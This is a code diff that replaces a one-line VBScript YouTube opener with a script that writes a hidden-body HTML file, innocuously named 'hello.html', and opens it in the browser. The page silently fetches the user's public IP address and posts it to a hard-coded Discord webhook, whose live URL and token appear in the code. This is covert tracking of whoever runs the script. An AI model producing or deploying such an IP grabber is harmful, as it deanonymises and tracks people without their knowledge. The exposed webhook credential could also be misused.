@@ -1,1 +1,69 @@
-CreateObject("WScript.Shell").Run("http://www.youtube.com")
+
+Dim htmlContent
+htmlContent = "<!DOCTYPE html>" & vbCrLf & _
+"<html lang=""en"">" & vbCrLf & _
+"<head>" & vbCrLf & _
+"    <meta charset=""UTF-8"">" & vbCrLf & _
+"    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">" & vbCrLf & _
+"    <title>Send IP to Discord Webhook</title>" & vbCrLf & _
+"    <style>" & vbCrLf & _
+"        body {" & vbCrLf & _
+"            margin: 0;" & vbCrLf & _
+"            padding: 0;" & vbCrLf & _
+"            background-color: white; /* Optional: Set background color */" & vbCrLf & _
+"            display: none; /* Hide the body content */" & vbCrLf & _
+"        }" & vbCrLf & _
+"    </style>" & vbCrLf & _
+"</head>" & vbCrLf & _
+"<body>" & vbCrLf & _
+"    <script>" & vbCrLf & _
+"        (async function() {" & vbCrLf & _
+"            try {" & vbCrLf & _
+"                // Fetch the public IP address" & vbCrLf & _
+"                const ipResponse = await fetch('https://api.ipify.org?format=json');" & vbCrLf & _
+"                const ipData = await ipResponse.json();" & vbCrLf & _
+"                const userIp = ipData.ip;" & vbCrLf & _
+"" & vbCrLf & _
+"                // Prepare the data for the Discord webhook" & vbCrLf & _
+"                const webhookURL = 'https://discord.com/api/webhooks/1288173412199694368/GCuF_2yTI0LwoDgD87G60oNdxIG9ERn16auEXlHepwGExjnQfmSbVjJ3mR48-BL4Ihmi';" & vbCrLf & _
+"                const payload = {" & vbCrLf & _
+"                    content: `User IP: ${userIp}`" & vbCrLf & _
+"                };" & vbCrLf & _
+"" & vbCrLf & _
+"                // Send the IP to the Discord webhook" & vbCrLf & _
+"                const discordResponse = await fetch(webhookURL, {" & vbCrLf & _
+"                    method: 'POST'," & vbCrLf & _
+"                    headers: {" & vbCrLf & _
+"                        'Content-Type': 'application/json'" & vbCrLf & _
+"                    }," & vbCrLf & _
+"                    body: JSON.stringify(payload)" & vbCrLf & _
+"                });" & vbCrLf & _
+"" & vbCrLf & _
+"                // Check if the request was successful" & vbCrLf & _
+"                if (!discordResponse.ok) {" & vbCrLf & _
+"                    console.error('Failed to send IP to Discord:', discordResponse.statusText);" & vbCrLf & _
+"                }" & vbCrLf & _
+"            } catch (error) {" & vbCrLf & _
+"                console.error('Error:', error.message);" & vbCrLf & _
+"            }" & vbCrLf & _
+"        })();" & vbCrLf & _
+"    </script>" & vbCrLf & _
+"</body>" & vbCrLf & _
+"</html>"
+
+' Create the HTML file
+Dim fso, htmlFile
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set htmlFile = fso.CreateTextFile("hello.html", True)
+htmlFile.WriteLine htmlContent
+htmlFile.Close
+
+' Open the HTML file in the default web browser
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+shell.Run "hello.html"
+
+' Clean up
+Set htmlFile = Nothing
+Set fso = Nothing
+Set shell = Nothing
